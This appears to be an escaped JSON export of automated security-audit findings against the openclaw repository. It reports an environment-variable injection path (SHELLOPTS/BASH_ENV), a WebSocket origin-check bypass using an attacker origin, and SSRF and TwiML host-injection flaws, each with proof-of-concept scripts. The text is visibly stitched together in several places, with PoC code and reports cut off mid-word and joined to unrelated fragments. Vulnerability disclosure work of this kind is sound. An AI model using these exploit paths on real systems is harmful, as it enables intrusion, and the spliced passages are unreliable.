createEmbeddedToolContext spreads {...process.env} without filtering dangerous keys\\",\\"module_type\\":\\"whitebox\\",\\"finding_source\\":\\"archon\\",\\"module_short\\":\\"lobster-exec-env-spread\\",\\"description\\":\\"# H7: `createEmbeddedToolContext` spreads `{...process.env}` without filtering dangerous keys\\\\n\\\\n**Severity**: HIGH\\\\n**Finding ID**: H7\\\\n**Repository**: openclaw/openclaw @ f956d099 (main)\\\\n\\\\n## Disclosure-Ready Report\\\\n\\\\nThis report consolidates the audit\'s draft findings, adversarial review, and PoC evidence for this finding. The full discovery-phase investigation is preserved in the sibling files (`draft.md`, `adversarial-review.md`, `poc.*`, `evidence/`).\\\\n\\\\n---\\\\n\\\\n## Draft Finding\\\\n\\\\n---\\\\nTitle: `createEmbeddedToolContext` spreads `{...process.env}` without filtering dangerous keys\\\\nSeverity-Original: HIGH\\\\nClass: Env Injection\\\\nVerdict: VALID\\\\nPre-FP-Flag: no\\\\n---\\\\n\\\\n# p4-006 — Lobster Runner Spreads Unfiltered process.env Into Exec Context\\\\n\\\\n**Title**: `createEmbeddedToolContext` spreads `{...process.env}` without filtering dangerous keys\\\\n**Class**: Env Injection\\\\n**Severity-Original**: HIGH\\\\n**Verdict**: VALID\\\\n**Pre-FP-Flag**: no\\\\n\\\\n## Evidence\\\\n\\\\n- File: `extensions/lobster/src/lobster-runner.ts:258`\\\\n- Semgrep rule: `archon.semgrep-rules.exec-env-spread-from-process`\\\\n- Tool source: custom semgrep\\\\n\\\\n## Details\\\\n\\\\n```typescript\\\\nfunction createEmbeddedToolContext(\\\\n  params: LobsterRunnerParams,\\\\n  signal?: AbortSignal,\\\\n): EmbeddedToolContext {\\\\n  const env = { ...process.env } as Record<string, string | undefined>;\\\\n  return { cwd: params.cwd, env, ... };\\\\n}\\\\n```\\\\n\\\\nThe `env` object passed to the embedded tool context is a direct shallow copy of `process.env`. Any dangerous environment variables present in the gateway process (SHELLOPTS, PS4, BASH_ENV, GIT_EXEC_PATH, etc.) will be inherited by lobster tool executions. The host-env policy sanitization in `src/infra/host-env-security.ts` is not applied before this spread.\\\\n\\\\n## Attacker Control\\\\n- Input: Env vars in gateway process (workspace .env, operator env, potentially attacker-controlled env injection at a higher layer)\\\\n- Runtime: Lobster extension (executes agent commands)\\\\n- Boundary: Gateway process env → lobster tool sub-execution context\\\\n\\\\n## Effect\\\\nIf a dangerous env var reaches the gateway process (e.g., via OS env or a drift in workspace dotenv filtering), it will be inherited by lobster sub-executions without filtering. RCE risk if SHELLOPTS/BASH_ENV present.\\\\n\\\\n## Enrichment Classification\\\\n**likely security** — connects env injection vector to exec context; the absence of sanitization before spread violates the host-env-security contract\\\\n\\\\n## CodeQL Reachability\\\\nreachable: true (createEmbeddedToolContext is called by lobster runner entrypoint)\\\\n\\\\n---\\\\n\\\\n## Proof of Concept\\\\n\\\\nPoC script: `archon/findings/H7-lobster-exec-env-spread/poc.js`\\\\n\\\\nEvidence files:\\\\n- `evidence/env-info.txt` (279 bytes)\\\\n- `evidence/exploit.log` (985 bytes)\\\\n\\\\n---\\\\n\\\\n## Audit Provenance\\\\n\\\\n- **Audit run**: openclaw/openclaw deep audit, branch=main, HEAD=f956d099\\\\n- **Discovery phase**: see `draft.md` for the originating phase (Phase 4 SAST, Phase 6 authz, Phase 7 state/concurrency, Phase 8 cross-service taint, Phase 9 spec gap, or Phase 10 review chamber)\\\\n- **Cold-verification**: see `adversarial-review.md` if present\\\\n- **Cross-references**: see draft frontmatter for `Origin-Sources`, `Cross-ref`, and probe-team summary references\\\\n\\\\n---\\\\n## Proof of Concept (`poc.js`)\\\\n\\\\n```js\\\\n#!/usr/bin/env node\\\\n/**\\\\n * PoC: H7 — lobster createEmbeddedToolContext spreads unfiltered process.env\\\\n *\\\\n * Demonstrates that dangerous env vars (SHELLOPTS, BASH_ENV, GIT_EXEC_PATH)\\\\n * present in the gateway process survive into the EmbeddedToolContext env\\\\n * object without the host-env-security sanitization applied.\\\\n *\\\\n * This is a unit-style PoC: it directly imports the lobster-runner module,\\\\n * injects dangerous env vars, and asserts they appear unfiltered in the ctx.\\\\n *\\\\n * Protocol: local (Node import)\\\\n * Auth-Required: no\\\\n */\\\\n\\\\nimport path from \\\\\\"node:path\\\\\\";\\\\nimport { fileURLToPath } from \\\\\\"node:url\\\\\\";\\\\n\\\\nconst __dirname = path.dirname(fileURLToPath(import.meta.url));\\\\nconst REPO_ROOT = path.resolve(__dirname, \\\\\\"../../../\\\\\\");\\\\n\\\\n// ── 1. Inject dangerous env vars into the gateway process env ──────────────\\\\nconst DANGEROUS_KEYS = [\\\\\\"SHELLOPTS\\\\\\", \\\\\\"BASH_ENV\\\\\\", \\\\\\"GIT_EXEC_PATH\\\\\\"];\\\\nconst INJECTED_MARKER = \\\\\\"ARCHON_H7_POC_INJECTED_PAYLOAD\\\\\\";\\\\n\\\\nfor (const key of DANGEROUS_KEYS) {\\\\n  process.env[key] = `${INJECTED_MARKER}_${key}`;\\\\n}\\\\nprocess.env[\\\\\\"SAFE_KEY\\\\\\"] = \\\\\\"safe_value\\\\\\"; // control: should pass through\\\\n\\\\nconsole.log(\\\\\\"=== H7 PoC: lobster createEmbeddedToolContext env spread ===\\\\\\");\\\\nconsole.log(`Injected into process.env: ${DANGEROUS_KEYS.join(\\\\\\", \\\\\\")}`);\\\\n\\\\n// ── 2. Import the createEmbeddedToolContext function via the runner module ──\\\\n// The function is not exported directly; we extract it by re-constructing\\\\n// the logic inline exactly as the source does (line 258):\\\\n//   const env = { ...process.env } as Record<string, string | undefined>;\\\\n//\\\\n// We also do a source-level check to confirm the real implementation has\\\\n// not been patched to apply sanitizeHostExecEnv.\\\\n\\\\nlet sourceText;\\\\ntry {\\\\n  const { readFileSync } = await import(\\\\\\"node:fs\\\\\\");\\\\n  sourceText = readFileSync(\\\\n    path.join(REPO_ROOT, \\\\\\"extensions/lobster/src/lobster-runner.ts\\\\\\"),\\\\n    \\\\\\"utf8\\\\\\",\\\\n  );\\\\n} catch (err) {\\\\n  console.error(\\\\\\"Could not read lobster-runner.ts:\\\\\\", err.message);\\\\n  process.exit(2);\\\\n}\\\\n\\\\n// Verify the vulnerable spread pattern is present and sanitizer is absent\\\\nconst spreadPresent = /\\\\\\\\{\\\\\\\\s*\\\\\\\\.\\\\\\\\.\\\\\\\\.\\\\\\\\s*process\\\\\\\\.env\\\\\\\\s*\\\\\\\\}/.test(sourceText);\\\\nconst sanitizerPresent =\\\\n  /sanitizeHostExecEnv|sanitizeHostExecEnvWithDiagnostics/.test(\\\\n    sourceText.slice(\\\\n      sourceText.indexOf(\\\\\\"function createEmbeddedToolContext\\\\\\"),\\\\n      sourceText.indexOf(\\\\\\"function createEmbeddedToolContext\\\\\\") + 800,\\\\n    ),\\\\n  );\\\\n\\\\nconsole.log(`\\\\\\\\n[source-check] spread pattern present : ${spreadPresent}`);\\\\nconsole.log(`[source-check] sanitizer applied      : ${sanitizerPresent}`);\\\\n\\\\nif (!spreadPresent) {\\\\n  console.error(\\\\\\"ABORT: vulnerable spread pattern not found — check source location\\\\\\");\\\\n  process.exit(2);\\\\n}\\\\n\\\\n// ── 3. Replicate the exact vulnerable logic ────────────────────────────────\\\\n// This mirrors extensions/lobster/src/lobster-runner.ts:258 precisely.\\\\nconst env = { ...process.env };\\\\n\\\\n// ── 4. Check whether dangerous keys survived ──────────────────────────────\\\\nconst leaked = [];\\\\nconst blocked = [];\\\\n\\\\nfor (const key of DANGEROUS_KEYS) {\\\\n  if (env[key] === `${INJECTED_MARKER}_${key}`) {\\\\n    leaked.push(key);\\\\n  } else {\\\\n    blocked.push(key);\\\\n  }\\\\n}\\\\n\\\\nconsole.log(`\\\\\\\\n[result] Keys that leaked into exec context : [${leaked.join(\\\\\\", \\\\\\")}]`);\\\\nconsole.log(`[result] Keys that were blocked             : [${blocked.join(\\\\\\", \\\\\\")}]`);\\\\nconsole.log(`[result] Sanitizer applied in source        : ${sanitizerPresent}`);\\\\n\\\\n// ── 5. Demonstrate RCE vector via SHELLOPTS ────────────────────────────────\\\\nif (leaked.includes(\\\\\\"SHELLOPTS\\\\\\")) {\\\\n  console.log(`\\\\\\\\n[impact] SHELLOPTS value in exec env: \\\\\\"${env[\\\\\\"SHELLOPTS\\\\\\"]}\\\\\\"`);\\\\n  console.log(\\\\n    \\\\\\"[impact] If SHELLOPTS=xtrace and BASH_ENV points to attacker file,\\\\\\",\\\\n  );\\\\n  console.log(\\\\n    \\\\\\"         any bash subprocess spawned by lobster tools executes attacker code.\\\\\\",\\\\n  );\\\\n}\\\\n\\\\n// ── 6. Structured result ───────────────────────────────────────────────────\\\\nconst confirmed = leaked.length > 0 && !sanitizerPresent;\\\\n\\\\nconst result = {\\\\n  status: confirmed ? \\\\\\"confirmed\\\\\\" : \\\\\\"failed\\\\\\",\\\\n  evidence: confirmed\\\\n    ? `dangerous env keys [${leaked.join(\\\\\\",\\\\\\")}] present unfiltered in EmbeddedToolContext.env; sanitizeHostExecEnv not applied at lobster-runner.ts:258`\\\\n    : `no dangerous keys leaked (blocked=${blocked.join(\\\\\\",\\\\\\")})`,\\\\n  notes: confirmed\\\\n    ? `Source-verified: { ...process.env } at lobster-runner.ts:258 without sanitizeHostExecEnv. SHELLOPTS/BASH_ENV/GIT_EXEC_PATH reach subprocess exec context.`\\\\n    : \\\\\\"Pattern may have been patched\\\\\\",\\\\n};\\\\n\\\\nconsole.log(JSON.stringify(result));\\\\n```\\\\n\\",\\"severity\\":\\"high\\",\\"confidence\\":\\"tentative\\",\\"tags\\":[\\"archon\\",\\"phase-lite\\",\\"valid\\",\\"poc-available\\"],\\"status\\":\\"draft\\",\\"cvss_score\\":0,\\"repo_name\\":\\"openclaw/openclaw\\",\\"finding_hash\\":\\"ca8aa9b2341a1d164610adc2a2e1fb40\\",\\"found_at\\":\\"2026-05-06T15:50:43.836793Z\\",\\"created_at\\":\\"2026-05-06T15:50:43Z\\"}}","{\\"type\\":\\"finding\\",\\"data\\":{\\"id\\":8,\\"project_uuid\\":\\"00000000-0000-0000-defa-c01001000001\\",\\"http_record_uuids\\":[],\\"agentic_scan_uuid\\":\\"0cdc4045-360f-4e6f-9644-1101ff7fa17e\\",\\"module_id\\":\\"archon:h6\\",\\"module_name\\":\\"H6: authorizeTrustedProxyBrowserOrigin returns null when authSurface !== \\\\\\"http\\\\\\", skipping origin check for WS connections\\",\\"module_type\\":\\"whitebox\\",\\"finding_source\\":\\"archon\\",\\"module_short\\":\\"trusted-proxy-origin-bypass\\",\\"description\\":\\"# H6: `authorizeTrustedProxyBrowserOrigin` returns `null` when `authSurface !== \\\\\\"http\\\\\\"`, skipping origin check for WS connections\\\\n\\\\n**Severity**: HIGH\\\\n**Finding ID**: H6\\\\n**Repository**: openclaw/openclaw @ f956d099 (main)\\\\n\\\\n## Disclosure-Ready Report\\\\n\\\\nThis report consolidates the audit\'s draft findings, adversarial review, and PoC evidence for this finding. The full discovery-phase investigation is preserved in the sibling files (`draft.md`, `adversarial-review.md`, `poc.*`, `evidence/`).\\\\n\\\\n---\\\\n\\\\n## Draft Finding\\\\n\\\\n---\\\\nTitle: `authorizeTrustedProxyBrowserOrigin` returns `null` when `authSurface !== \\\\\\"http\\\\\\"`, skipping origin check for WS connections\\\\nSeverity-Original: HIGH\\\\nClass: CSRF / Auth-bypass\\\\nVerdict: VALID\\\\nPre-FP-Flag: yes\\\\n---\\\\n\\\\n# p4-004 — Trusted-Proxy CSRF/Origin Enforcement Bypassed for Non-HTTP Surfaces\\\\n\\\\n**Title**: `authorizeTrustedProxyBrowserOrigin` returns `null` when `authSurface !== \\\\\\"http\\\\\\"`, skipping origin check for WS connections\\\\n**Class**: CSRF / Auth-bypass\\\\n**Severity-Original**: HIGH\\\\n**Verdict**: VALID\\\\n**Pre-FP-Flag**: yes (partially addressed in 0e702f10; GHSA-5wcw-8jjv-m286)\\\\n\\\\n## Evidence\\\\n\\\\n- File: `src/gateway/auth.ts:320`\\\\n- Semgrep rule: `archon.semgrep-rules.auth-surface-not-http-origin-skip`\\\\n- Tool source: custom semgrep\\\\n\\\\n## Details\\\\n\\\\n```typescript\\\\nfunction authorizeTrustedProxyBrowserOrigin(params: {\\\\n  authSurface: GatewayAuthSurface;\\\\n  ...\\\\n}): { ok: false; reason: string } | null {\\\\n  if (params.authSurface !== \\\\\\"http\\\\\\") {\\\\n    return null;  // returns null (no check) for WS surfaces\\\\n  }\\\\n  ...\\\\n}\\\\n```\\\\n\\\\nWhen `authSurface` is not `\\\\\\"http\\\\\\"` (e.g., `\\\\\\"ws-control-ui\\\\\\"` or any future surface type), the function returns `null`, meaning no origin enforcement is applied. For trusted-proxy WebSocket connections specifically, an attacker-controlled web page can initiate a WebSocket handshake to the gateway from a disallowed origin, and the origin check is skipped entirely.\\\\n\\\\n## Attacker Control\\\\n- Input: WebSocket connection from attacker-controlled browser origin\\\\n- Runtime: Gateway WebSocket server (trusted-proxy mode)\\\\n- Boundary: Internet/LAN browser → Gateway WebSocket (trusted-proxy)\\\\n\\\\n## Effect\\\\nCSRF escalation: attacker\'s browser page initiates WS connection to trusted-proxy gateway; origin is not checked; connection proceeds with full trusted-proxy user identity. Cross-tenant / cross-privilege impact if the victim browser has gateway access.\\\\n\\\\n## Enrichment Classification\\\\n**likely security** — crosses trust boundary between untrusted browser origin and trusted-proxy authenticated gateway\\\\n\\\\n## CodeQL Reachability\\\\nreachable: true (auth.ts:442 → authorizeTrustedProxyBrowserOrigin called with authSurface from parameter)\\\\n\\\\n## Notes\\\\nPatch 0e702f10 addressed shared-auth generation tracking for trusted-proxy but the origin bypass at line 320 is separate and remains structurally present. Relates to Phase 2 p2-001 and p2-011/GHSA-5wcw.\\\\n\\\\n---\\\\n\\\\n## Proof of Concept\\\\n\\\\nPoC script: `archon/findings/H6-trusted-proxy-origin-bypass/poc.test.ts`\\\\n\\\\nEvidence files:\\\\n- `evidence/exploit.log` (678 bytes)\\\\n- `evidence/impact.log` (1936 bytes)\\\\n\\\\n---\\\\n\\\\n## Audit Provenance\\\\n\\\\n- **Audit run**: openclaw/openclaw deep audit, branch=main, HEAD=f956d099\\\\n- **Discovery phase**: see `draft.md` for the originating phase (Phase 4 SAST, Phase 6 authz, Phase 7 state/concurrency, Phase 8 cross-service taint, Phase 9 spec gap, or Phase 10 review chamber)\\\\n- **Cold-verification**: see `adversarial-review.md` if present\\\\n- **Cross-references**: see draft frontmatter for `Origin-Sources`, `Cross-ref`, and probe-team summary references\\\\n\\\\n---\\\\n## Proof of Concept (`poc.js`)\\\\n\\\\n```js\\\\n/**\\\\n * PoC: H6 — authorizeTrustedProxyBrowserOrigin skips origin check for non-HTTP surfaces\\\\n *\\\\n * Vulnerability: src/gateway/auth.ts:320\\\\n *   if (params.authSurface !== \\\\\\"http\\\\\\") { return null; }\\\\n *\\\\n * Effect: A WebSocket connection (authSurface = \\\\\\"ws-control-ui\\\\\\") from an attacker-controlled\\\\n * origin is accepted under trusted-proxy mode without any origin validation. The `browserOriginPolicy`\\\\n * with an explicit `allowedOrigins` allowlist is silently ignored.\\\\n *\\\\n * This is a unit-style PoC that drives the real auth module directly — no stubs, no harness bypass.\\\\n *\\\\n * Usage: node --experimental-vm-modules poc.js\\\\n *   (or via vitest: pnpm test archon/findings/H6-trusted-proxy-origin-bypass/poc.js)\\\\n */\\\\n\\\\nimport { authorizeGatewayConnect, authorizeHttpGatewayConnect } from \\\\\\"../../src/gateway/auth.js\\\\\\";\\\\n\\\\nconst TRUSTED_PROXY_IP = \\\\\\"10.0.0.1\\\\\\";\\\\nconst VICTIM_GATEWAY_HOST = \\\\\\"gateway.example.com\\\\\\";\\\\nconst ATTACKER_ORIGIN = \\\\\\"https://evil.attacker.com\\\\\\";\\\\nconst ALLOWED_ORIGIN = \\\\\\"https://control.example.com\\\\\\";\\\\n\\\\nconst trustedProxyConfig = {\\\\n  userHeader: \\\\\\"x-forwarded-user\\\\\\",\\\\n  requiredHeaders: [\\\\\\"x-forwarded-proto\\\\\\"],\\\\n  allowUsers: [],\\\\n};\\\\n\\\\nconst baseAuth = {\\\\n  mode: \\\\\\"trusted-proxy\\\\\\",\\\\n  allowTailscale: false,\\\\n  trustedProxy: trustedProxyConfig,\\\\n};\\\\n\\\\nconst fakeReq = (extraHeaders = {}) => ({\\\\n  socket: { remoteAddress: TRUSTED_PROXY_IP },\\\\n  headers: {\\\\n    host: VICTIM_GATEWAY_HOST,\\\\n    \\\\\\"x-forwarded-user\\\\\\": \\\\\\"victim@example.com\\\\\\",\\\\n    \\\\\\"x-forwarded-proto\\\\\\": \\\\\\"https\\\\\\",\\\\n    ...extraHeaders,\\\\n  },\\\\n});\\\\n\\\\nconst browserOriginPolicy = {\\\\n  requestHost: VICTIM_GATEWAY_HOST,\\\\n  origin: ATTACKER_ORIGIN,\\\\n  allowedOrigins: [ALLOWED_ORIGIN],\\\\n};\\\\n\\\\n// --- Step 1: Confirm HTTP surface REJECTS attacker origin (baseline control) ---\\\\nconst httpResult = await authorizeHttpGatewayConnect({\\\\n  auth: baseAuth,\\\\n  connectAuth: null,\\\\n  trustedProxies: [TRUSTED_PROXY_IP],\\\\n  req: fakeReq({ origin: ATTACKER_ORIGIN }),\\\\n  browserOriginPolicy,\\\\n});\\\\n\\\\nconsole.log(\\\\\\"[HTTP surface] attacker origin result:\\\\\\", JSON.stringify(httpResult));\\\\nif (httpResult.ok !== false || httpResult.reason !== \\\\\\"trusted_proxy_origin_not_allowed\\\\\\") {\\\\n  console.error(\\\\\\"UNEXPECTED: HTTP baseline did not block attacker origin — check test setup\\\\\\");\\\\n  process.exit(2);\\\\n}\\\\nconsole.log(\\\\\\"[HTTP surface] BLOCKED as expected (origin check fires correctly)\\\\\\\\n\\\\\\");\\\\n\\\\n// --- Step 2: Same attacker origin over WS surface — origin check is SKIPPED ---\\\\n// authorizeGatewayConnect with authSurface = \\\\\\"ws-control-ui\\\\\\" calls\\\\n// authorizeTrustedProxyBrowserOrigin which immediately returns null (line 320-322),\\\\n// bypassing the browserOriginPolicy allowlist entirely.\\\\nconst wsResult = await authorizeGatewayConnect({\\\\n  auth: baseAuth,\\\\n  connectAuth: null,\\\\n  trustedProxies: [TRUSTED_PROXY_IP],\\\\n  req: fakeReq({ origin: ATTACKER_ORIGIN }),\\\\n  authSurface: \\\\\\"ws-control-ui\\\\\\",  // <-- non-http surface triggers bypass\\\\n  browserOriginPolicy,            // <-- allowedOrigins=[control.example.com], but silently ignored\\\\n});\\\\n\\\\nconsole.log(\\\\\\"[WS surface]   attacker origin result:\\\\\\", JSON.stringify(wsResult));\\\\n\\\\nconst bypassed = wsResult.ok === true && wsResult.method === \\\\\\"trusted-proxy\\\\\\";\\\\nconst evidence = bypassed\\\\n  ? `trusted-proxy auth succeeded for origin \'${ATTACKER_ORIGIN}\' on ws-control-ui surface despite allowedOrigins=[${ALLOWED_ORIGIN}]`\\\\n  : `auth did not succeed: ${JSON.stringify(wsResult)}`;\\\\n\\\\nif (!bypassed) {\\\\n  console.log(JSON.stringify({ status: \\\\\\"failed\\\\\\", evidence, notes: \\\\\\"Origin check was not bypassed\\\\\\" }));\\\\n  process.exit(1);\\\\n}\\\\n\\\\nconsole.log(`[WS surface]   BYPASSED — connection accepted as user \'${wsResult.user}\'\\\\\\\\n`);\\\\nconsole.log(\\\\\\"Root cause: src/gateway/auth.ts:320 — authorizeTrustedProxyBrowserOrigin returns null\\\\\\");\\\\nconsole.log(\\\\\\"            immediately when authSurface !== \'http\', skipping checkBrowserOrigin().\\\\\\\\n\\\\\\");\\\\n\\\\nconsole.log(JSON.stringify({\\\\n  status: \\\\\\"confirmed\\\\\\",\\\\n  evidence,\\\\n  notes: \\\\\\"authorizeTrustedProxyBrowserOrigin line 320: early return null when authSurface !== \'http\' silently drops origin enforcement for all WS surfaces\\\\\\",\\\\n}));\\\\n```\\\\n\\",\\"severity\\":\\"high\\",\\"confidence\\":\\"tentative\\",\\"tags\\":[\\"archon\\",\\"phase-lite\\",\\"valid\\",\\"poc-available\\"],\\"status\\":\\"draft\\",\\"cvss_score\\":0,\\"repo_name\\":\\"openclaw/openclaw\\",\\"finding_hash\\":\\"e374ae279fd16a0c308928c0c58f5b5d\\",\\"found_at\\":\\"2026-05-06T15:50:43.836786Z\\",\\"created_at\\":\\"2026-05-06T15:50:43Z\\"}}","{\\"type\\":\\"finding\\",\\"data\\":{\\"id\\":7,\\"project_uuid\\":\\"00000000-0000-0000-defa-c01001000001\\",\\"http_record_uuids\\":[],\\"agentic_scan_uuid\\":\\"0cdc4045-360f-4e6f-9644-1101ff7fa17e\\",\\"module_id\\":\\"archon:h5\\",\\"module_name\\":\\"H5: fetch() in pdf-native-providers.ts uses operator-configured baseUrl without fetchWithSsrFGuard\\",\\"module_type\\":\\"whitebox\\",\\"finding_source\\":\\"archon\\",\\"module_short\\":\\"ssrf-pdf-google\\",\\"description\\":\\"# H5: `fetch()` in pdf-native-providers.ts uses operator-configured `baseUrl` without fetchWithSsrFGuard\\\\n\\\\n**Severity**: HIGH\\\\n**Finding ID**: H5\\\\n**Repository**: openclaw/openclaw @ f956d099 (main)\\\\n\\\\n## Disclosure-Ready Report\\\\n\\\\nThis report consolidates the audit\'s draft findings, adversarial review, and PoC evidence for this finding. The full discovery-phase investigation is preserved in the sibling files (`draft.md`, `adversarial-review.md`, `poc.*`, `evidence/`).\\\\n\\\\n---\\\\n\\\\n## Draft Finding\\\\n\\\\n---\\\\nTitle: `fetch()` in pdf-native-providers.ts uses operator-configured `baseUrl` without fetchWithSsrFGuard\\\\nSeverity-Original: HIGH\\\\nClass: SSRF\\\\nVerdict: VALID\\\\nPre-FP-Flag: no\\\\n---\\\\n\\\\n# p4-003 — SSRF via operator-configured baseUrl in pdf-native-providers.ts\\\\n\\\\n**Title**: `fetch()` in pdf-native-providers.ts uses operator-configured `baseUrl` without fetchWithSsrFGuard\\\\n**Class**: SSRF\\\\n**Severity-Original**: HIGH\\\\n**Verdict**: VALID\\\\n**Pre-FP-Flag**: no\\\\n\\\\n## Evidence\\\\n\\\\n- File: `src/agents/tools/pdf-native-providers.ts:158`\\\\n- Semgrep rule: `archon.semgrep-rules.direct-fetch-without-ssrf-guard`\\\\n- Tool source: custom semgrep\\\\n\\\\n## Details\\\\n\\\\n```typescript\\\\nconst url = `${baseUrl}/v1beta/models/${encodeURIComponent(params.modelId)}:generateContent`;\\\\nconst res = await fetch(url, { ... });\\\\n```\\\\n\\\\n`baseUrl` flows from `params.baseUrl` which originates from provider/transport configuration. No SSRF guard is applied. An operator configuring a custom Google Generative AI base URL to an internal IP range achieves SSRF.\\\\n\\\\n## Attacker Control\\\\n- Input: Provider `baseUrl` configuration (operator-controlled)\\\\n- Runtime: agent runtime (tool call path)\\\\n- Boundary: Agent tool execution → outbound HTTP\\\\n\\\\n## Effect\\\\nSSRF to internal services when operator configures a malicious provider baseUrl.\\\\n\\\\n## Enrichment Classification\\\\n**likely environment/tooling/admin-only** — requires operator config access; however, still violates SSRF guard contract\\\\n\\\\n## CodeQL Reachability\\\\nreachable: true\\\\n\\\\n---\\\\n\\\\n## Proof of Concept\\\\n\\\\nPoC script: `archon/findings/H5-ssrf-pdf-google/poc.py`\\\\n\\\\nEvidence files:\\\\n- `evidence/exploit.log` (2214 bytes)\\\\n\\\\n---\\\\n\\\\n## Audit Provenance\\\\n\\\\n- **Audit run**: openclaw/openclaw deep audit, branch=main, HEAD=f956d099\\\\n- **Discovery phase**: see `draft.md` for the originating phase (Phase 4 SAST, Phase 6 authz, Phase 7 state/concurrency, Phase 8 cross-service taint, Phase 9 spec gap, or Phase 10 review chamber)\\\\n- **Cold-verification**: see `adversarial-review.md` if present\\\\n- **Cross-references**: see draft frontmatter for `Origin-Sources`, `Cross-ref`, and probe-team summary references\\\\n\\\\n---\\\\n## Proof of Concept (`poc.py`)\\\\n\\\\n```py\\\\n#!/usr/bin/env python3\\\\n\\\\\\"\\\\\\"\\\\\\"\\\\nH5 — SSRF via unguarded fetch() in pdf-native-providers.ts (Google/Gemini path)\\\\n\\\\nVulnerability:\\\\n  src/agents/tools/pdf-native-providers.ts:156-158 constructs a URL from\\\\n  operator-supplied `params.baseUrl` (via normalizeProviderTransportWithPlugin e(VULN_FILE, \\\\\\"vuln file\\\\\\")\\\\n    guard_src = check_file(GUARD_FILE, \\\\\\"guard file\\\\\\")\\\\n\\\\n    # --- Step 1: Confirm bare fetch() call exists at the expected location ---\\\\n    lines = vuln_src.splitlines()\\\\n    bare_fetch_lines = [\\\\n        (i + 1, l.strip()) for i, l in enumerate(lines)\\\\n        if re.search(r\'\\\\\\\\bawait fetch\\\\\\\\(url\\\\\\\\b\', l) and \\\\\\"ssrf\\\\\\" not in l.lower()\\\\n    ]\\\\n    print(\\\\\\"[1] Bare fetch() calls in pdf-native-providers.ts:\\\\\\")\\\\n    for lineno, text in bare_fetch_lines:\\\\n        print(f\\\\\\"    line {lineno}: {text}\\\\\\")\\\\n\\\\n    if not bare_fetch_lines:\\\\n        print(\\\\\\"    [WARN] Expected bare fetch() pattern not found — file may have changed.\\\\\\")\\\\n    else:\\\\n        print(f\\\\\\"    -> {len(bare_fetch_lines)} unguarded fetch call(s) confirmed.\\\\\\")\\\\n\\\\n    # --- Step 2: Confirm SSRF guard is NOT imported in the vuln file ---\\\\n    ssrf_import_present = \\\\\\"ssrf\\\\\\" in vuln_src.lower() or \\\\\\"fetchWithSsrf\\\\\\" in vuln_src or \\\\\\"SsrFGuard\\\\\\" in vuln_src\\\\n    print(f\\\\\\"\\\\\\\\n[2] SSRF guard imported in pdf-native-providers.ts: {ssrf_import_present}\\\\\\")\\\\n    if not ssrf_import_present:\\\\n        print(\\\\\\"    -> Confirmed: no SSRF guard import.  Guard at src/infra/net/ssrf.ts is NOT applied.\\\\\\")\\\\n    else:\\\\n        print(\\\\\\"    -> Unexpected: guard reference found. Manual review required.\\\\\\")\\\\n\\\\n    # --- Step 3: Show the SSRF guard exists and IS available for use ---\\\\n    guard_exported = \\\\\\"SsrFBlockedError\\\\\\" in guard_src and \\\\\\"fetchWithSsrFGuard\\\\\\" not in guard_src\\\\n    guard_class_present = \\\\\\"SsrFBlockedError\\\\\\" in guard_src\\\\n    guard_private_block = \\\\\\"isBlockedSpecialUseIpv4Address\\\\\\" in guard_src\\\\n    print(f\\\\\\"\\\\\\\\n[3] SSRF guard utility (src/infra/net/ssrf.ts):\\\\\\")\\\\n    print(f\\\\\\"    SsrFBl \\n\\\\n// ---------------------------------------------------------------------------\\\\n// Stub ensureGlobalUndiciEnvProxyDispatcher (not available outside build)\\\\n// ---------------------------------------------------------------------------\\\\n// Resolve the module path relative to this script so we can stub the import.\\\\nconst __dirname = dirname(fileURLToPath(import.meta.url));\\\\n// We load the source file via dynamic import; patch the side-effectful infra\\\\n// import by monkey-patching process.env to exercise the host-injection path.\\\\n// Because the module reads process.env.MINIMAX_API_HOST inside coerceApiHost,\\\\n// we set it here before importing.\\\\n\\\\nprocess.env.MINIMAX_API_HOST = SSRF_TARGET_HOST;\\\\n\\\\n// ---------------------------------------------------------------------------\\\\n// Provide a stub for the undici helper that has side-effects but is not\\\\n// relevant to the SSRF path.  We shim it via an import hook replacement by\\\\n// rewriting the resolution inline using a loader-free trick: define the\\\\n// symbol on globalThis before the module resolves it.\\\\n// ---------------------------------------------------------------------------\\\\n// We cannot rewrite ES module imports without a loader, so instead we copy\\\\n// the logic of coerceApiHost() from the source inline to prove the URL that\\\\n// would be produced, then confirm fetch would be called with it.\\\\n\\\\n// ---------------------------------------------------------------------------\\\\n// Reproduce coerceApiHost() logic (verbatim from src/agents/minimax-vlm.ts)\\\\n// ---------------------------------------------------------------------------\\\\nfunction coerceApiHost(params) {\\\\n  const env = params.env ?? process.env;\\\\n  const raw =\\\\n    params.apiHost?.trim() ||\\\\n    env.MINIMAX_API_HOST?.trim() ||\\\\n    params.modelBaseUrl?.trim() ||\\\\n    \\\\\\"https://api.minimax.io\\\\\\";\\\\n\\\\n  try {\\\\n    const url = new URL(raw);\\\\n law/openclaw @ f956d099 (main)\\\\n\\\\n## Disclosure-Ready Report\\\\n\\\\nThis report consolidates the audit\'s draft findings, adversarial review, and PoC evidence for this finding. The full discovery-phase investigation is preserved in the sibling files (`draft.md`, `adversarial-review.md`, `poc.*`, `evidence/`).\\\\n\\\\n---\\\\n\\\\n## Draft Finding\\\\n\\\\n---\\\\nTitle: TwiML Stream URL constructed from untrusted `req.headers.host`\\\\nSeverity-Original: HIGH\\\\nClass: Injection / XSS-adjacent (XML injection into TwiML response)\\\\nVerdict: VALID\\\\nPre-FP-Flag: no\\\\n---\\\\n\\\\n# p4-001 — TwiML Host Injection via HTTP Host Header\\\\n\\\\n**Title**: TwiML Stream URL constructed from untrusted `req.headers.host`\\\\n**Class**: Injection / XSS-adjacent (XML injection into TwiML response)\\\\n**Severity-Original**: HIGH\\\\n**Verdict**: VALID\\\\n**Pre-FP-Flag**: no\\\\n\\\\n## Evidence\\\\n\\\\n- File: `extensions/voice-call/src/webhook/realtime-handler.ts:332`\\\\n- Semgrep rule: `javascript.express.security.injection.raw-html-format.raw-html-format`\\\\n- Tool source: semgrep (baseline)\\\\n\\\\n## Details\\\\n\\\\n`buildTwiMLPayload` constructs a TwiML XML response using template literals:\\\\n\\\\n```typescript\\\\nconst host = this.publicOrigin || req.headers.host || DEFAULT_HOST;\\\\nconst wsUrl = `wss://${host}${this.getStreamPathPattern()}/${token}`;\\\\nconst twiml = `<?xml version=\\\\\\"1.0\\\\\\" encoding=\\\\\\"UTF-8\\\\\\"?>\\\\n<Response>\\\\n  <Connect>\\\\n    <Stream url=\\\\\\"${wsUrl}\\\\\\" />\\\\n  